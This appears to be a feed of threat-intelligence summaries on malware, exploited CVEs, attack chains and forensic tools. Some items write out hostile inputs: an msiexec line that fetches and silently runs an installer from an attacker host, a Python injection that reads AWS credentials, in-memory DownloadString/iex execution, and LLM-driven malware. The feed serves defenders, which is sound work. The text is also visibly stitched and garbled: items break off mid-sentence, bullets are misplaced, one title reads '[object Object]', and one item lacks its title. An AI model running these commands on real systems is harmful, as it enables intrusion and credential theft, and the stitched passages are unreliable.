item.title: MacSync under the microscope: new delivery methods and a new payload
item.description:
MacSync infostealer overhauled in September 2026: binary droppers replace AppleScripts, iCloud abused for payload delivery, and a new Objective-C/Swift backdoor added to the chain.
- MacSync, a MaaS crypto/infostealer first advertised as Mac.c in 2025, now uses a multi-stage binary infection chain starting with a malicious DMG. The loader strips the com.apple.quarantine xattr, XOR-decrypts a URL from its overlay using key 736f6e6f6d61626c6407, then fetches stage two from either an attacker server or a public iCloud Calendar (caldav.icloud[.]com). The calendar file is piped line by line into zsh -s, where the interpreter ignores calendar syntax until it hits the malicious DESCRIPTION field, a clean living-off-the-land trick that bypasses many content filters.
- Subsequent droppers decrypt payloads with AES-CBC (keys and IVs are in the report), and the stage four dropper adds VM detection via sysctl kern.hv_vmm_present and machdep.cpu.brand_string, plus PT_DENY_ATTACH to block debugger attachment. Final-stage modules are delivered using ECDH Curve25519 key exchange (pkgunpack utility) with per-session keys, AES-GCM decryption, and deliberate buffer zeroing after use to frustrate memory forensics.
- The Swift infostealer harvests browser data, keychain files, SSH/AWS/Kubernetes/GIT configs, Telegram data, ZSH/Bash history, and crypto wallet data. It uses the PAM API (not dscl) for password verification, a technique first observed in July 2026 with Pam Stealer.

item.title: Low-Level Extraction the Apple TV 4K 2nd Generation
item.description:
ElcomSoft adds bootloader-level extraction for Apple TV 4K 2nd Gen via the usbliter8 exploit, bypassing the SoC change that made checkm8 incompatible with this device.
Key findings:
- The 2nd Gen Apple TV 4K uses a newer SoC incompatible with checkm8, so ElcomSoft developed usbliter8, delivered via a Waveshare RP2350 microcontroller board flashed with custom firmware from github[.]com/Elcomsoft/usbliter8. The board is a one-time flash and reusable across sessions.
- Physical access to the device's hidden Lightning port requires a Foxlink X892 GoldenEye adapter under the RJ-45 connector, plus either a DCSD adapter or a Colobus cable to force DFU mode. No external USB port exists on this device, making hardware prep the hardest step.
- Once usbliter8 applies (board LED goes solid green), extraction commands mirror the checkm8 workflow: boot ramdisk, unlock data partition read-only without passcode, extract keychain with full decryption, and image the file system with checksum verification.
- The toolkit unlocks the data partition without requiring a passcode, and extracts a decrypted keychain dump, giving investigators credential material and full file system access on tvOS devices that otherwise offer no logical acquisition path.
Practitioner takeaway: if an Apple TV 4K 2nd Gen appears in scope, document its serial to confirm generation, acquire the Foxlink adapter and RP2350 board before the exam, and treat keychain output as priority evidence.

item.title: CLOSEDQUORUM, the malware that asks four AI models what to do next
item.description:
CLOSEDQUORUM delegates tactical C2 to a four-LLM voting panel, no human operator required. Cisco Talos documents the first Windows implant to replace attacker decision-making with AI consensus, targeting credentials and crypto wallets.
Key details:
- Four commercial LLMs (DeepSeek, Qwen, Mistral, Google Gemini) each receive a host-context prompt and return one of four actions: steal, inject, persist, or move. Majority vote wins; ties break by fixed model priority. No C2 server, no human in the loop during execution.
- "Steal" runs simultaneously: LSASS memory dump, browser credential harvest from Chrome, Edge, and Firefox, and crypto wallet scanning for MetaMask and Exodus. Exfil goes AES-256-GCM encrypted to a Discord webhook as base64 blocks, bypassing domain/IP blocklists entirely.
- The encryption is theater: the key derives from the current date, meaning the developer can decrypt any operator's haul by knowing the day. Dev builds contain real API keys baked in at compile time, suggesting a credentials-as-a-service model sold to paying operators.
- Detection rests on behavioral correlation, not a single IOC: a Windows process polling multiple AI provider APIs plus Discord in a short window, combined with LSASS access or suspended process creation, is the signature Talos flags.
Hunt for Windows executables making outbound HTTPS to AI provider endpoints and Discord webhooks within the same short interval while also touching LSASS.

item.title: Is This A Joke? In The Auth Header? (F5 BIG-IP UnAuth Heap-Overflow to RCE CVE-2026-94127)
item.description:
F5 BIG-IP APM heap overflow CVE-2026-94127 allows unauthenticated RCE via an oversized Authorization header. Actively exploited in the wild before patch release on Sept 22, 2026.
Key findings:
- The root cause is a missing bounds check in tmm64 (the F5 traffic management microkernel). A 0x4100-byte heap buffer is allocated for the OAuth userinfo flow, but the unpatched code copies the Authorization header value directly into that buffer without validating length first. A GET to /f5-oauth2/v1/userinfo with a Bearer token exceeding 0x4100 bytes triggers heap corruption, overwriting a function pointer at buffer+0x4ff8 and redirecting execution. No authentication required.
- Exploitation works despite ASLR and NX because tmm64 has no PIE (base 0x400000), giving stable gadget addresses. A stack pivot chains into a ret2plt execvp call. SELinux blocks exec syscalls, so the bypass appends commands to /etc/bigstart/scripts/tmm.finish, a hook Bash script that runs automatically when tmm crashes, turning the crash itself into the execution trigger.
- Affected: BIG-IP APM 21.x (21.1.0) and 17.x (17.1.0-17.5.1). Fixes are in Hotfix-BIGIP-21.1.0.2.0.30.22 and Hotfix-BIGIP-17.1.3.5.0.41.14. Other BIG-IP modules and BIG-IQ have no fix listed.
- Detection artifacts: look for tmm process crashes in /var/log/tmm, unexpected writes to /etc/bigstart/scripts/tmm.finish, and oversized Authorization headers in access logs on the /f5-oauth2/ path.

- C2 addresses are retrieved from Telegram channels in encrypted form, enabling dynamic infrastructure rotation. An exposed FastAPI panel revealed endpoints for fetching overlays and receiving stolen credentials.

item.title: Hunting Invisible Unicode in Emails (+ KQL Queries)
item.description:
Invisible Unicode characters in email subjects and sender display names can silently bypass string-matching detections while leaving the rendered message visually unchanged to the human reader.
- Attackers insert zero-width and directional Unicode characters (U+200B-U+200F, U+202A-U+202E, U+2060-U+206F, U+FEFF) inside words like "Microsoft" to break exact-match filters. The user sees nothing different; a parser or security product may see a completely different string, undermining keyword-based detections and potentially manipulating AI email agents that process extracted text rather than rendered HTML.
- The hunting approach targets EmailEvents in Microsoft Defender XDR via KQL, extracting suspicious characters from Subject and SenderDisplayName using extract_all with the Unicode ranges above, then building a composite risk score: +40 for Unicode symbols/icons in subject (U+2600-U+27BF), +20 for hidden Unicode in subject, +20 for hidden Unicode in SenderDisplayName, +20 for multi-country sender infrastructure.
- The query retains NetworkMessageId and RecipientEmailAddress, making it suitable as a Defender XDR Custom Detection rule, not just a one-time hunt. Output is sorted by RiskScore descending so the highest-signal emails surface first.
Takeaway: Run the full KQL from the report against your EmailEvents table. A non-zero RiskScore is a hunting lead, not a verdict.

item.title: Meet AvisLoader: A Windows Loader Built to Outlast a Takedown
item.description:
AvisLoader is a new Windows loader using the Tox P2P protocol for C2, making traditional domain-based takedowns ineffective. Discovered on an exposed staging server alongside a ClickFix lure, it bundles persistence, UAC bypass, and process-hiding into a single package.
- Delivery starts with a ClickFix lure hosted on Cloudflare Workers, impersonating a DocuSign signing page. Victims paste a command that fetches and executes code from a trycloudflare[.]com Quick Tunnel address, bypassing the browser download flow entirely (T1204.004).
- The 3.4 MB 64-bit loader statically links c-toxcore, routing all C2 over the Tox P2P network. The operator retains identity portability by copying a Tox save file, no domain needed. Build path C:\Users\dev\Desktop\c-toxcore is embedded and recoverable.
- Persistence targets desktop and taskbar shortcuts, modified to launch the malware then open the real app. Look for .backup files alongside shortcuts and references to VLCAssistant (T1547.009).
- Bundled helpers: auto.exe implements UACME method 41 via ICMLuaUtil COM class {3E5FC7F9-9A51-4367-9063-A120244FBEC7} (T1548.002). hmn_hook.dll hooks NtQuerySystemInformation to hide processes from the result list (T1014), exporting HMN_HideStart, HMN_HideStatus, HMN_HideStop.
Hunt for SHA-256 35dd164a[...]dd13c2cc (78324.exe), f0a6870c[...]07ff3975 (auto.exe), and cd1e835f[...]5d38b5f5 (hmn_hook.dll).

item.title: CVE-2026-93616: Check Point Management Server Zero-Day Exploited in Targeted Attacks
item.description:
CVE-2026-93616 (CVSS 9.8): Check Point Management Server zero-day exploited in targeted attacks nearly two months before patches shipped, enabling unauthenticated RCE on the infrastructure that controls your firewall estate.
- Actively exploited in the wild. Check Point confirmed a handful of targeted intrusions on July 23, 2026, while patches arrived September 22. Any management server exposed to untrusted networks during that window must be treated as potentially compromised, not just patched and closed.
- The exploit chain requires no credentials, no existing account, no user interaction. An attacker with network access to the Check Point Management web service sends a crafted request, escapes filesystem boundaries via path traversal, writes attacker-controlled files, then executes arbitrary scripts or loads arbitrary Java classes, full RCE from the outside.
- Affected: Security Management Server, Multi-Domain Management, Log Server, Multi-Domain Log Server, and SmartEvent across R80 through R82.20. R80/R81 branches are end-of-support. Fixes: R82.20 Hot Fix Take 1, R82 Jumbo Take 127, R81.20 Jumbo Take 170, R81.10 Jumbo Take 192. LivePatch Take 28/29 does NOT fix this.
- Post-exploitation risk is severe: policy tampering, log manipulation, credential and certificate theft, pivot to all managed gateways. Preserve logs externally now, as a successful attacker may have altered local evidence.

item.title: OAuth Token Theft Through Microsoft's Front Door | Huntress
item.description:
A Microsoft-signed binary, WWAHost.exe, can be weaponized via a sideloaded AppX package to present a real Microsoft login dialog and steal OAuth tokens including refresh tokens, bypassing MFA entirely because the user authenticates legitimately.
Key findings:
- The attack chain requires Developer Mode enabled (HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock, AllowDevelopmentWithoutDevLicense=1) or an enterprise AllowAllTrustedApps sideloading policy. Once set, a standard user runs Add-AppxPackage -Register with no UAC prompt. The AppX manifest declares WindowsRuntimeAccess="all" in ContentUriRules, granting attacker-hosted JavaScript full WinRT API access inside a trusted Microsoft process.
- The JavaScript calls the legacy WebAuthenticationBroker using Microsoft Office's own client ID (d3590ed6-52b3-4102-aeff-aad2292ab01c) and an oob redirect URI. The user sees a real login.microsoftonline[.]com dialog, completes MFA, and the auth code returns directly to the attacker. The captured token carries the full Office delegated scope set: Mail.ReadWrite, Files.ReadWrite.All, Teams, Directory.Read.All, and AuditLog.Create.
- Entra sign-in logs show Application "Microsoft Office," Status Success, no risk flags, indistinguishable from a routine sign-in except for one field: the user agent MSAuthHost/1.0 on Trident for the broker leg, while exfil traffic to attacker infrastructure carries MSAppHost/3.0 on EdgeHTML. That divergence is the detection.

item.title: Low-Level Extraction of the Apple Watch S4/S5
item.description:
Apple Watch Series 4 and 5 now support bootloader-level extraction via usbliter8, a SecureROM exploit targeting the S4/S5 chip generation beyond the A11 boundary where checkm8 stops.
Key details:
- usbliter8 exploits the SecureROM (read-only boot code) on S4/S5 Apple Watch chips, the generation after checkm8's A11 ceiling. The exploit is applied via an RP2350 microcontroller board (Waveshare RP2350 USB-A recommended), flashed once with firmware from github[.]com/Elcomsoft/usbliter8. After flashing, the board handles all subsequent extractions.
- The method is forensically sound: all operations run in RAM, the OS never boots, and the data partition is mounted read-only. Repeated extractions produce identical checksums, satisfying evidentiary integrity requirements.
- Extraction requires a watch adapter for the hidden diagnostic port (MagicAWRT, S-DOCK, or MaAnt AWRT confirmed compatible) and iOS Forensic Toolkit 10.11 on Mac or Linux. Windows support is in testing.
- Post-exploit commands mirror checkm8 workflows: boot ramdisk, unlock data partition (passcode required), extract keychain via ramdisk keychain, and image the filesystem via ramdisk tar with checksum verification. The keychain pull decrypts credentials stored on the watch.
If you have Apple Watch Series 4 or 5 in evidence, this gives you full filesystem and decrypted keychain access. The DFU timing window (2.5-3 seconds between button releases) is the only friction point.

item.title: Berlin Data Leak: What Rhysida Published, and What Is Still Unresolved
item.description:
Rhysida publishes 1.44M files from Berlin state network after 30 BTC ransom refused. The long-tail credential and certificate exposure is still live weeks after systems were restored.
Key findings:
- Two Senate administrations breached (urban development and transport/environment). Data outflow ran August 7-12, 2026, confirmed by filename activity dropping to near zero after August 11, consistent with the August 14 disconnection. Systems stayed severed until August 23, stalling housing and family support payments. Initial access vector unconfirmed, but German 🇩🇪 reporting points to a phishing email in the transport administration; Rhysida's documented TTPs per CISA advisory AA23-319A also include credential-stuffing against VPN endpoints lacking MFA and CVE-2020-1472 (Zerologon).
- The secrets footprint is what makes this severe. SOCRadar's path-listing analysis found approximately 3,900 certificate and private-key containers, two dozen password-manager databases, and hundreds of files whose names explicitly describe plaintext credentials or admin account lists. Server inventories, directory-service documentation, firewall configs, and network diagrams were also present. A second tranche surfaced September 6-7 with claimed working plaintext credentials for building-management and e-payment systems.
- Refusing to pay converted an extortion problem into a permanent exposure problem. The archive is publicly accessible.
#DFIR_Radar | View on X: https://x.com/DFIR_Radar/status/2102730572858642622

item.title: Operation Conflict Compass: Konni Targets Ukraine via Malicious LNK Lures
item.description:
DPRK Konni group targets Ukraine-focused diplomats and think tanks in Operation Conflict Compass, deploying a new modular downloader called VelvetCake via LNK lures and trojanized Zoom installers.
- Initial access arrives as ZIP archives containing LNK files masquerading as PDFs (T1566.001, T1036.007). Lure themes include Russia-Ukraine 🇺🇦 peace frameworks, Strait of Hormuz food security impacts, and a Ukrainian 🇺🇦 social researcher CV, pointing squarely at diplomatic entities, NGOs, and defense think tanks. A trojanized Zoom installer (SHA256: 0db1e8a3075ffc2f5caa91abaeabb6ba4365ae0eda64d179374614a79e317733) delivers the same payload chain (T1566.002).
- The LNK drops two payloads from a GitHub staging repo: update1.vbs creates a scheduled task named OneDriveUpdateScheduler that runs update2.ps1 every minute via explorer.exe (T1053.005). An alternate variant skips disk writes entirely, using Net.WebClient.DownloadString and iex to execute VelvetCake in memory directly from C2.
- VelvetCake (T1095) opens a raw TCP socket to 111.92.246[.]145:12345, authenticates with hardcoded PASSWORD MySecurePass123, pulls queued PowerShell scripts, executes them, exfiltrates output files from C:UsersPublic via UPLOAD with a 0x12345678 header flag, then deletes artifacts.

item.title: Inside a multi stage toll fraud operation targeting Poland
item.description:
Polish 🇵🇱 users hit by a sophisticated toll fraud ring using Meta ads and Google Play apps to silently charge premium SMS and carrier billing without victim awareness.
Key details:
- CERT Polska preserved 1,235 fraudulent Meta ads, linking 852 of them to 17 malicious Android applications distributed through Google Play, connected via shared code and overlapping infrastructure
- The full execution chain was reconstructed end-to-end: deceptive ads lure victims to install apps, which then receive silent tasking to trigger premium SMS subscriptions or carrier billing charges without user interaction
- Attribution confidence is high because investigators observed live tasking in action, meaning the C2 infrastructure was caught actively instructing devices to commit fraud in real time
- Linkage across 17 apps was established through code similarity and shared infrastructure, a classic cluster pivot that suggests a single threat actor or affiliate operating at scale
- The fraud mechanism abuses legitimate carrier billing and premium SMS systems, meaning charges appear on phone bills rather than payment cards, making victim detection and chargeback significantly harder
Hunt for Android apps with SEND_SMS, READ_PHONE_STATE, and RECEIVE_WAP_PUSH permissions installed from Play around the campaign window. Cross-reference billing anomalies with app install timestamps. Full IOC list, ad samples, and infrastructure details are in the CERT Polska report.

item.title: [object Object]
item.description:
Water Hydra's DarkMe RAT drops zero-day delivery for plain .pif phishing, reaching beyond forex traders into corporate environments. The loader chain is unchanged; only the entry point got cheaper.
- Water Hydra (EvilNum/DarkCasino) swapped CVE-2023-38831 and CVE-2024-21412 for a malspam link pointing to image.pif (SHA256: 394c93df...), a PE32+ binary Windows executes on double-click. The .pif extension is a DOS-era relic with no legitimate modern use, making any execution event an immediate hunt priority. The file was masqueraded as a PNG and delivered from readonline365[.]com and four other hosts, all scoring 0 malicious on VirusTotal at discovery.
- The chain: PIF spawns msiexec /i hxxps://onlineview365[.]com/propi.msi /quiet, which drops components to %AppData%\ComponentsFolder\ via EXPAND.EXE, runs prnfig.wsf to write a COM registration (CLSID {CFDC57BA-1705-45AF-BA10-EFC3D592982B}) via reg.exe import, then fires rundll32.exe /sta {CLSID}, an opaque invocation with no DLL path on the command line, through three VB6 loader DLLs: Coconout.dll, Use.dll (FillText), and Finalized.dll (Calculation).
- Use.dll gates on a 329-app process list containing wallets, trading terminals, game launchers, and RGB utilities but zero analysis tools. This is an inverted sandbox check: no Steam or Slack means no real user, and execution stops cleanly.

item.title: Macfinger ClickFix campaign, (Tue, Sep 22nd)
item.description:
"Macfinger" ClickFix campaign injects scripts into legitimate websites to fingerprint and socially engineer macOS users into running AMOS Stealer variants. Active now with fresh IOCs from 2026-09-22.
- Compromised legitimate sites serve injected JavaScript that loads from velvet-otter-glagceis[.]life, presenting a fake bot-protection page. ClickFix instructions trick the user into running a command manually, the classic clipboard-paste social engineering move (T1204.002). While the page is displayed, the domain fires repeated HTTPS POST requests to /collect, tracking user behavior in real time.
- On execution, a Bash script drops from 45.150.33[.]128 (SHA-256: 9d87b41c2b29ccbeac851b98f1a7dce4ab4781fec0cbc55fa6f93a6299a3d564). item.title: Digital Forensics: Deep Analysis with Plaso
item.description:
Plaso super-timeline construction from NTUSER.DAT, Windows Event Logs, and disk images gives investigators full-system visibility when SIEM and Sysmon are absent.

- NTUSER.DAT parsing is the highest-value starting point: the hive records USB connections, recently accessed folders, typed paths, and program execution history per user. Running log2timeline directly against the hive extracts the full user-activity timeline without needing a mounted volume.

- Full-disk imaging via E01 lets log2timeline sweep all supported artifact locations in one pass, producing a super-timeline that correlates across log sources and closes gaps left by missing enterprise logging.
When logging infrastructure is absent, run log2timeline against NTUSER.DAT first to establish user-activity baseline, then layer in System.evtx and a full E01 pass.

item.description:

item.title: Windows Exploitation Techniques: Dangling COM Object Registrations
item.description:
CVE-2026-66804 is an incomplete fix for the "Dark Elevator" LPE bug, abusing a dangling COM registration for CrossDevice to plant a DLL and achieve SYSTEM via a mis-configured Shell Create Object Handler service.
Key findings:
- The root cause is a stale CLSID {E9F83CF2-E0C0-4CA7-AF01-E90C70BEF496} registered system-wide pointing to %PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll, a path that does not exist but sits in C:\ProgramData, which any user can write to. Planting the DLL there is the primitive.
- Execution into a privileged process abuses custom COM marshaling (T1559.001). A fake IMarshal implementation returns the dangling CLSID, and that Custom OBJREF is sent to the Shell Create Object Handler (CLSID 135fd325-45b7-4c30-89f8-4386961669f0), a dllhost running as NT AUTHORITY\SYSTEM with CustomMarshalAllowed: True.
- The target service is not auto-started; an attacker first triggers the \Microsoft\Windows\Shell\CreateObjectTask scheduled task (accessible to normal users) and creates the global event ShellCreateObjectTaskReadyEvent to keep it alive, then calls ICreateObject::Proc3 passing the fake marshaled object to trigger unconditional unmarshaling and DLL load.
- A PowerShell hunting script using OleViewDotNet can enumerate all in-process COM classes from the machine hive where LoadLibrary fails, surfacing other dangling registrations beyond CrossDevice.
Patch CVE-2026-66804 immediately.

item.title: Vidar Adds Virtual Machine and Custom Stream Ciphers For String Obfuscation
item.description:
Vidar infostealer upgraded from XOR to a per-build custom VM plus stream cipher between May and September 2026, deliberately breaking static signatures with every new sample.
Key findings:
- Starting with internal version 2.0 in June 2026, Vidar replaced ChaCha20 with a lightweight bytecode interpreter running a 256-entry dispatch table and 14 opcode handlers (XOR, add, subtract, rotate, NOT, multiply, sbox lookup). Crucially, opcodes, constants, and the 4-byte XOR seed change per build, so a signature written against one sample breaks on the next.
- The VM serves two roles: direct string deobfuscation, or decrypting the key and nonce fed into a secondary custom stream cipher. From v2.2 onward the cipher uses ARX transformations seeded with FNV-1a prime 0x01000193 and golden-ratio constant 0x9E3779B9, with unique operation sequences per build.
- Decrypted strings confirm full infostealer capability: browser credential harvesting, HWID generation failure strings, HTTP Accept headers for C2 comms, and wallet/plugin grab statistics (e.g. "browsers: %d (%d rules), wallets: %d").
- Four confirmed sample hashes span the v2.0-to-v3.4 arc: v2.0 1628bb03db87f67661349e169d73ee14ed490bd, v2.5 625a381981fc2d4c25c981d98b1d66bb2cf5da2d, v3.1 2d43d592630ad1e012da63ef7279f95dd4a8e949, v3.4 979048a749d8f28d877c7068b1b336ecd1e34986.

item.title: Serverless, Not Riskless: Exploiting Unauthenticated API Gateways in AWS
item.description:
Unauthenticated AWS API Gateway endpoints backed by over-permissioned Lambda functions create a zero-credential path from a single HTTP request to IAM credential theft and Secrets Manager access.
Key findings:
- API Gateway sets authorizationType to NONE by default on every method. No account-level policy or SCP blocks unauthenticated deployment, so the responsibility falls entirely on the developer. All stages, including dev and staging, are equally exploitable and are often configured with fewer restrictions than prod.
- The full attack chain uses only AWS CLI and plain curl. Enumerate APIs with get-rest-apis, pull source code via get-function (available to ReadOnly roles), identify eval() or exec() sinks in the code, then inject __import__('os').environ['AWS_ACCESS_KEY_ID'] through an unauthenticated GET. All three STS credential values return in the HTTP response body, no exploit tooling required.
- GuardDuty has directly relevant findings: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration fires when Lambda credentials are used from a non-AWS IP, and CredentialAccess:Lambda/AnomalousBehavior fires on unusual execution role usage. CloudTrail logs every subsequent API call with source IP, user agent, and request parameters. API Gateway access logging is off by default and must be explicitly enabled.

item.title: The Sound of Silence: SAP SM49/SM69 and the OS Commands Your SIEM Never Hears
item.description:
SAP SM49/SM69 external OS command execution leaves no trace in the Security Audit Log on the most common invocation path, creating a silent blind spot most SIEM deployments never close.
- SM49/SM69 commands run via sapxpg as the sidadm OS user. The SAP Security Audit Log (SAL) records only "Transaction SM49 started" for the interactive dialog path and a generic RFC logon (AU5) for the RFC path. No event type exists in the SAL schema for the command name, binary, or runtime parameters. A SIEM ingesting only SAL sees a session open and nothing more.
- The runtime parameter string is where the real risk lives. On this SAP NetWeaver AS ABAP 7.52 system, 72 of 75 Linux-applicable shipped commands allow additional parameters at runtime. A user can point find at /tmp and pass -exec /usr/bin/id as a runtime argument. The SM69 definition never reflects this. Reviewing command definitions alone does not reveal what actually ran.
- OS auditd is the only source that captures the full argv on every path (dialog, RFC, background), because every invocation funnels through sapxpg. The verified process chain is: SAP work process → sapxpg → binary. The background job log (TBTC* tables) also records the command and parameters, but only for scheduled jobs, not interactive runs.

item.title: Released an open-source Windows timeline correlator (wfcr) to tackle triage fragmentation and anti-forensics
item.description:
Open-source tool WFCR correlates Windows dead-box artifacts into a single master timeline, with built-in heuristics to flag timestomping and ghost execution automatically.
Key details:
- Ingests $MFT, Shimcache (AppCompatCache), Amcache, BAM/DAM, and SRUM (SRUDB.dat) in a single offline pass, normalizing timestamps across all sources and emitting JSON Lines for Splunk, Elastic, or Sentinel, or CSV for Timeline Explorer
- Anti-forensic detection uses $STANDARD_INFORMATION vs $FILE_NAME temporal drift to catch API-level timestomping (SetFileTime), flagging manipulation that raw parsers silently miss
- Ghost execution logic cross-references Shimcache, Amcache, and BAM execution records against currently allocated MFT paths, surfacing binaries that ran and were deleted from disk, a common attacker cleanup step
- SRUM correlation dynamically resolves the SruDbIdMapTable schema at runtime rather than relying on hardcoded offsets, linking network byte transfer volumes back to specific executing binaries and user SIDs
Takeaway: if you are spending hours manually stitching CSV exports across subsystems, WFCR is worth a test run. Point it at your dead-box artifact collection and let the correlation logic surface timestamp drift and wiped payloads before you start your manual review. Validated on Python 3.10-3.12 on native Windows runners. Repo and simulated triage demo are on GitHub.

item.title: Wordfence Argus Discovers Critical Vulnerability in libheif, the Library That Opens iPhone Photos on Your Server
item.description:

- CVE not yet public (score assigned by maintainer Dirk Farin: CVSS 9.8 Critical). Affected versions: libheif 1.18.0 through 1.23.2, but only when compiled with WITH_UNCOMPRESSED_CODEC=ON. The overflow lives in the uncompressed color-plane decoder: it reads bit-depth from the first chroma plane and uses that width to write into both planes, overflowing the second when depths differ. Attacker controls both the written bytes and overflow length through the file itself.

The official WordPress Docker image (Debian 13, libheif 1.19.8) satisfied every condition out of the box. Wordfence demonstrated protected-file disclosure and code execution on that exact deployment; a narrower copy-file test succeeded 29 of 30 attempts against a live Apache server.
- Exploitation is environment-specific but not impractical. HEIF Heist showed tailoring similar libheif bugs to a new target took roughly one to two days. Shared hosting fleets built from the same base image multiply that leverage: work done once applies to all identical deployments.

AI-assisted attacker ops platforms "Loot" and "UltraVault" exposed without auth, holding 42,000+ stolen secrets including AWS keys and live AI provider credentials across 15 LLM services.
Key findings:
- UltraVault is a full post-exploitation console: one-click AWS pair correlation via /api/pairs and /api/actions/aws_pair, 14 LPE exploit recommendations per victim host, web shell re-establishment via wp_reshell and wp_rexploit, and credential minting, all accessible without authentication. Five named exploit chains are tracked internally: react2shell, wp2shell, xss2shell, joomla2shell, and deep.
- The platform's AI credential inventory spans 1,778 records across OpenAI, Gemini, Anthropic, and others. Only 2.7% of the 42,286 total secrets are listed as live, but the platform continuously re-probes stolen keys, including AWS Bedrock calls: GetCallerIdentity, ListFoundationModels, then InvokeModel bursts across regions in under a minute.
- Two user agents flag this activity for detection: a Boto3 client advertising kali-cloud in its platform string (os/linux.16.8+kali-cloud-amd64) and bare Python-urllib/3.13 with no SDK. Temporary STS credentials with ASIA-prefixed access key IDs were also actively validated by the same host.

item.title: Nozomi identifies 12 vulnerabilities in Siemens SCALANCE LPE9403, enabling root access and OT network attacks
item.description:
12 vulnerabilities in Siemens SCALANCE LPE9403 enable chained root access, telemetry manipulation, and lateral movement across OT networks. Patch to firmware V4.0 HF0 or above immediately.
- CVE-2025-40572, CVE-2025-40573, and CVE-2025-40574 chain to escalate a read-only local account to root on the LPE9403 (CVSS up to 8.5). From there, an attacker controls telemetry before it reaches SCADA, falsifying sensor values and suppressing alarms while the physical process runs in an unsafe state.
- If SINEMA Remote Connect Edge Client V2.1 or below is installed, CVE-2025-40582 (command injection) lets a compromised SINEMA server push root commands to every connected LPE device. One rogue server becomes multi-site OT compromise. CVE-2025-40581 adds authentication bypass; CVE-2025-40583 exposes credentials in cleartext.
- The second attack path requires only SSH access plus the SINEMA auth bypass to redirect the client to an attacker-controlled server, triggering the command injection and achieving root without touching the SINEMA infrastructure at all.
- Impact at root: credential and config exfiltration, network mapping of OT assets, service disruption, and persistent footholds that bridge separate OT segments for lateral movement.
Update SCALANCE LPE9403 firmware to V4.0 HF0, segment the device from untrusted networks, and audit SINEMA Remote Connect server trust relationships.

item.title: Sysmon Modular, a new toolkit for building and tuning your configuration
item.description:
Sysmon Modular gets a Go-native toolkit for building, validating, and diff-ing configurations, plus new modules covering AI agents, credential artifacts, and browser extensions.
Key details:
- The core utility is now a single Go binary with no third-party dependencies, shipping prebuilt for Windows, Linux, and macOS on x64 and ARM64. It replaces the older PowerShell and Python scripts as the supported path. Commands cover merge, validate, diff, analyze, and coverage, with ATT&CK Navigator layer output defaulting to ATT&CK 18.
- The diff command compares parsed rule expressions and their Boolean grouping rather than raw XML text, so an AND-to-OR change stays visible while a formatting change does not. The analyze command flags hazardous exclusions such as a well-known binary excluded by filename alone rather than full path, which can suppress a different binary using that name from an unexpected directory.
- New modules cover security-control changes, credential artifacts, browser and editor extensions, and AI agent execution, including Claude, Codex, Cursor, Copilot, Gemini CLI, and others launched as node.exe. Four FileCreate (Event 11) modules track agent configuration and hook files, mapped to T1546, consistent with MITRE now explicitly listing AI coding-agent hook persistence.
- Pre-built consolidated configs move to GitHub Releases, built by CI/CD for Sysmon 15.21, 14.16, 13.34, and 12.03. Update any automation pulling raw-repository URLs.

item.title: Beware the SparroWock: The backdoor that bites, the commands that catch
item.description:
Chinese 🇨🇳 APT FamousSparrow deploys new SparroWocky backdoor against Latin American governments, replacing SparrowDoor as its primary implant since August 2025.
- FamousSparrow pivoted geographically hard: 90% of targets from mid-2025 into 2026 are Latin American government entities across Argentina 🇦🇷, Ecuador, Guatemala, Honduras 🇭🇳, Panama, Peru 🇵🇪, Puerto Rico, and Venezuela. ESET ties this to China 🇨🇳's reaction to US 🇺🇸 pressure in the region, including Panama's legal challenge to a Chinese-operated port concession. Initial access via exploiting public-facing Exchange servers (T1190).
- SparroWocky is a distinct C++ backdoor, not a SparrowDoor variant. Deployed via DLL side-loading trident loader (T1574.001): legitimate EXE, patched malicious DLL (seen as winfsp-x64.dll, DukeQt.dll), and RC4-encrypted .dat payload file. Magic bytes MZ/PE are stripped from the in-memory payload to evade scanners. SHA-1 of primary sample: 44F0A22B143B79FA760BF31E14C8FFF714C8A2A1.
- Evasion stack is deep: SilentMoonwalk call stack spoofing, MinHook hooking CreateThread to display AnimateWindow as thread start address, custom API hashing (T1027.007), and forged PEB_LDR_DATA_TABLE_ENTRY structures to hide reflectively loaded PEs. BOF execution (command 0x14) via embedded COFF Loader lets operators run Cobalt Strike-compatible modules in-process.

item.title: From Registry-Stored PowerShell to In-Memory Cryptocurrency Mining: A Multi-Stage Infection Chain
item.description:
XMRig cryptominer delivered through a five-stage chain using Registry-stored PowerShell, DNS TXT C2, and .NET assemblies hidden inside PNG and WAV files, all executing fully in memory.
- Registry key HKLM:\Software\uf42a9660377\vstdfehzr holds a binary-encoded PowerShell payload executed via vstdfehze.ps1 with -executionPolicy Bypass. DNS TXT queries to sslvalidcert[.]com, later txtcdn[.]net and httptls[.]org via DNS-over-HTTPS, resolve C2 addresses and steer payload delivery, using an X-HWID header to track infected hosts.
- PNG steganography: frames-1zm.pages[.]dev/frames.png carries a hidden script in the red pixel channel. WAV files (Atsg.wav, Tmav.wav, Realtek HD Audio.wav from publicwavlib.pages[.]dev) embed .NET assemblies in the lower nibbles of audio bytes past the 44-byte header, all loaded via [Reflection.Assembly]::Load() with nothing written to disk.
- Persistence is layered: hidden Scheduled Tasks run the encrypted payload at logon and on interval; a WMI permanent event subscription fires on a Registry condition change. Defender exclusions are added broadly, PowerShell history is wiped, and telemetry is weakened via a .NET DLL loaded in-memory.
- Final payload is XMRig (RandomX rx/0), configured remotely via config-rg7.pages[.]dev/config.txt. WinRing0.sys is dropped for MSR access. C2 at 104.21.2[.]193:8443 persists independently of mining, meaning the host stays controllable even after the miner is found.

item.title: MikroTrick: Inside the RouterOS Takeover Chain
item.description:
MikroTik routers were being exploited before patches went public. Bishop Fox reproduced the full unauthenticated takeover chain and found persistence artifacts on real compromised devices that survive a patch.
Key findings:
- The attack chain is unauthenticated, meaning no credentials are needed to gain control of the router. Exploitation happened before fixes were publicly available, placing every exposed MikroTik device in the window of risk regardless of patch timing.
- Bishop Fox recovered persistence artifacts on real-world compromised devices, confirming attackers were not just popping shells and leaving. Responders cannot treat a patched router as a clean router without investigating what was left behind.
- The reproduction of the full takeover chain gives defenders a concrete attack path to model detections against. The methodology matters here: the chain exists, it works, and it was used in the wild before defenders had a patch to apply.
- RouterOS forensics are non-standard. Evidence lives in the router's file system, scheduler jobs, user accounts, scripts, and firewall rules. These artifacts do not surface in traditional endpoint telemetry and require direct device inspection.
If you manage MikroTik devices, patching is not enough. Pull the user list, scheduler entries, scripts, and firewall rules from every device and compare against a known-good baseline.

